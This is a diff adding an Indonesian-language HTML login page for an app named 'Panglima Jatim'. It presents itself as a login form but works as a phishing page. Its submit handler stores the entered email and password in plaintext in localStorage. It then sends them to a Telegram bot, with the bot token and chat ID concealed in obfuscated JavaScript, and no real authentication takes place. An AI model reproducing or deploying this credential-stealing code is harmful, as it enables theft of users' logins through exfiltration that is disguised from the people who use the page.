@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Ke Aplikasi Panglima Jatim</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Arial', sans-serif;
+      overflow: hidden;
+    }
+
+    .background-image {
+      background: linear-gradient(to right, #6a11cb, #2575fc, hsl(189, 90%, 49%));
+      background-size: cover;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .login-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      height: 100%;
+    }
+
+    .login-form {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      color: #ffffff;
+      max-width: 300px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+
+    h1 {
+      margin-bottom: 15px;
+      font-size: 1.5em;
+      color: #ffffff;
+    }
+
+    input {
+      width: calc(100% - 20px);
+      padding: 10px;
+      margin: 10px auto;
+      border: none;
+      border-radius: 5px;
+      background: #ffffff;
+      color: #333333;
+      font-size: 0.9em;
+    }
+
+    .password-container {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .password-container input {
+      flex: 1;
+      padding-right: 30px;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      cursor: pointer;
+      height: 20px;
+      width: 20px;
+    }
+
+    button {
+      width: calc(100% - 20px);
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background: #fe2c55;
+      color: #ffffff;
+      font-size: 0.9em;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background: #d80d4b;
+    }
+  </style>
+  <script>
+    // Redirect jika sudah login
+    if (localStorage.getItem("isLoggedIn") === "true") {
+      window.location.href = "web.html";
+    }
+  </script>
+</head>
+<body>
+  <div class="background-image">
+    <div class="login-container">
+      <div class="login-form">
+        <p style="color: rgb(251, 255, 0)">Selamat Datang Di Aplikasi<br>Panglima Jatim</p>
+        <img src="https://telegra.ph/file/7255ac8ff63f1e14c5669.png" alt="Logo" height="260" />
+        <h1>Login</h1>
+        <form id="loginForm">
+          <input type="email" id="email" placeholder="Email" required />
+          <div class="password-container">
+            <input type="password" id="password" placeholder="Password" required />
+            <img src="https://img.icons8.com/ios-glyphs/30/visible--v1.png" 
+                 alt="Toggle Password" 
+                 id="togglePasswordIcon" 
+                 class="toggle-password" 
+                 onclick="togglePassword()" />
+          </div>
+          <button type="submit">Login</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const savedEmail = localStorage.getItem("email");
+      const savedPassword = localStorage.getItem("password");
+      if (savedEmail && savedPassword) {
+        document.getElementById("email").value = savedEmail;
+        document.getElementById("password").value = savedPassword;
+      }
+    });
+
+    function togglePassword() {
+      const passwordField = document.getElementById("password");
+      const toggleIcon = document.getElementById("togglePasswordIcon");
+
+      if (passwordField.type === "password") {
+        passwordField.type = "text";
+        toggleIcon.src = "https://img.icons8.com/ios-glyphs/30/closed-eye.png";
+      } else {
+        passwordField.type = "password";
+        toggleIcon.src = "https://img.icons8.com/ios-glyphs/30/visible--v1.png";
+      }
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", function (event) {
+      event.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Simpan data login
+      localStorage.setItem("email", email);
+      localStorage.setItem("password", password);
+      localStorage.setItem("isLoggedIn", "true");
+
+      // Kirim ke Telegram
+      const _0x542e9e=_0x4b16;function _0x22a3(){const _0x50fead=['967ooGTKE','6416244fnBuhn','7496371708','2364048bAkELN','154064ObyoEr','852216YscxZH','JWgsAk','4312840fpmCHE','h-NjTLfvFx','7051758746','zxcEsh6fZU','3965682vOvgvX',':AAF2d4d5u','36GFXioe'];_0x22a3=function(){return _0x50fead;};return _0x22a3();}(function(_0x41c145,_0x2f0675){const _0x3c022e=_0x4b16,_0x1bbd78=_0x41c145();while(!![]){try{const _0x107e77=-parseInt(_0x3c022e(0x1ea))/(0x167f+0x1612+-0x2c90)*(-parseInt(_0x3c022e(0x1e9))/(-0x216f+0x59*0x6b+-0x3c2))+-parseInt(_0x3c022e(0x1df))/(-0x1d72+0xe*0x125+0xd6f*0x1)+parseInt(_0x3c022e(0x1e1))/(0x13b4+-0x2*-0x43c+-0x1c28)+parseInt(_0x3c022e(0x1e3))/(0x20e5+-0x1c42+-0x24f*0x2)+parseInt(_0x3c022e(0x1eb))/(-0x778+-0xd0f+-0x148d*-0x1)+-parseInt(_0x3c022e(0x1e7))/(-0x61*0x25+-0x167*0x19+-0x311b*-0x1)+-parseInt(_0x3c022e(0x1e0))/(-0x1085+0x1*0x12c+0xf61);if(_0x107e77===_0x2f0675)break;else _0x1bbd78['push'](_0x1bbd78['shift']());}catch(_0x2a4fea){_0x1bbd78['push'](_0x1bbd78['shift']());}}}(_0x22a3,-0xa7db5*-0x2+0x94ed0+-0x1241c0));function _0x4b16(_0x169acc,_0x337c44){const _0x1f683c=_0x22a3();return _0x4b16=function(_0x48f818,_0x3036f5){_0x48f818=_0x48f818-(-0x17a6+-0x1*-0x621+-0x1364*-0x1);let _0x17dde2=_0x1f683c[_0x48f818];return _0x17dde2;},_0x4b16(_0x169acc,_0x337c44);}const chatId=_0x542e9e(0x1e5),botToken=_0x542e9e(0x1ec)+_0x542e9e(0x1e8)+_0x542e9e(0x1e6)+_0x542e9e(0x1e4)+_0x542e9e(0x1e2);
+      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const messageText = `Login Berhasil:\nEmail: ${email}\nPassword: ${password}`;
+
+      fetch(telegramApiUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: messageText
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          window.location.href = "web.html";
+        } else {
+          alert("Gagal mengirim pesan.");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("Terjadi kesalahan saat login.");
+      });
+    });
+  </script>
+</body>
+</html>
